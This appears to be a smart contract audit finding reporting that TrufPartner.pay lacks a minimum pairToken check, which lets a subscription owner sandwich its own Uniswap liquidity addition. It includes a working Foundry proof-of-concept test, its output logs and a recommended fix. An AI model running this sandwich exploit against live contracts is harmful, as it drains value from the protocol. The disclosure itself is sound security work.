# `TrufPartner.pay` can be sandwiched, providing a profit to the subscription owner

## Summary

`TrufPartner.pay` sends an external call to Uniswap to add liquidity in a TRUF pair without checking if a sufficient amount of `pairToken` has been added to the pool. This call can potentially be sandwiched by large swaps in either direction, resulting in the subscription owner adding significantly less liquidity in the `pairToken`.

## Vulnerability Detail

The owner of the `TrufPartner` contract deposits a certain amount of TRUF tokens when initiating a subscription. It is expected that the subscription owner matches this `trufAmount` with an equivalent amount (in terms of reserve ratio) of `pairToken` by adding liquidity to an existing Uniswap pool when calling `TrufPartner.pay`.

In `TrufPartner.pay`, a value of zero ([TrufPartner#L144](https://github.com/sherlock-audit/2023-12-truflation/blob/main/truflation-contracts/src/TrufPartner.sol#L144)) is provided for the minimum amount of `pairToken` expected to be added as liquidity, and the check for the return value of `addLiquidity` to verify the sufficiency of the added `pairToken` amount is skipped.

Even though the `lpTokenMinOut` parameter is provided to check for the minimum output of LP tokens, a subscription owner can perform a sandwich attack as follows:
- Call `TrufPartner.pay` with `lpTokenMinOut` set to `0`.
- Frontrun the above transaction by performing a relatively large TRUF > `pairToken` swap in the Uniswap pool.
- The pool's reserve ratio is now heavily in favor of TRUF, and substantially less liquidity is added in the `pairToken`.
- Backrun the pay transaction and swap back the `pairToken` received in the frontrunner transaction.

### POC

This test function can be added to [TrufPartner.t.sol](https://github.com/sherlock-audit/2023-12-truflation/blob/main/truflation-contracts/test/TrufPartner.t.sol) and executed using: `forge test --mt test_pay_sandwichAttack -vv`

```solidity
function test_pay_sandwichAttack() external {
        pOwner = address(this);

        _initiate();

        // Mint truf token for the attacker
        trufToken.mint(address(this), 1e23);

        address[] memory path = new address[](2);
        path[0] = address(trufToken);
        path[1] = address(usdtToken);

        // Frontrun the pay transaction with a huge swap
        trufToken.approve(address(uniswapRouter), 1e23);
        uint256[] memory amounts =
            uniswapRouter.swapExactTokensForTokens(1e23, 0, path, address(this), block.timestamp + 1000);

        // The LP within the payment transaction gets sandwiched
        // Note: lpTokenMinOut is set to the low value of 1
        _pay();

        // Reverse path
        path[1] = address(trufToken);
        path[0] = address(usdtToken);

        // Backrun the pay transaction and swap out the previously received pair token
        usdtToken.approve(address(uniswapRouter), amounts[1]);
        uniswapRouter.swapExactTokensForTokens(amounts[1], 0, path, address(this), block.timestamp + 1000);

        console.log("Expected liquidity to be added in USDt: ", usdtTokenMaxIn);

        // Substantially less liquidity is added in the pair token i.e usdt
        console.log("Actual liquidity added in USDt: ", usdtTokenMaxIn - usdtToken.balanceOf(address(this)));
        console.log("TRUF tokens spent on fees in the attack: ", 1e23 - trufToken.balanceOf(address(this)));

        // If the admin cancels the subscription or equivalently when it ends and liquidity is returned
        // to the subscription owner
        _cancel();
       
        // The subscription owner profits on the pair token
        console.log("USDt balance after full attack completion: ", usdtToken.balanceOf(address(this)));
    }
```


## Impact

**POC Logs**
```javascript
Expected liquidity to be added in USDt:  4000000000
Actual liquidity added in USDt:  1876407305
TRUF tokens spent in the attack:  388176310581578056515
USDt balance after full attack completion:  4622037600
```
As is evident from the logs received from the POC:
- The subscription owner adds significantly less liquidity in USDt, i.e., the `pairToken`, than expected.
- When the subscription ends or is manually cancelled by the owner of `TrufPartner`, the subscription owner ends up making a profit in USDt.

## Tool used

Manual Review

## Recommendation

- Revert `TrufPartner.pay` if a certain minimum amount of `pairToken` has not been added as liquidity.
- `TrufPartner.pay` can pull the current reserve ratio from the Uniswap pool and use it as a base to set the minimum expected liquidity to be added.
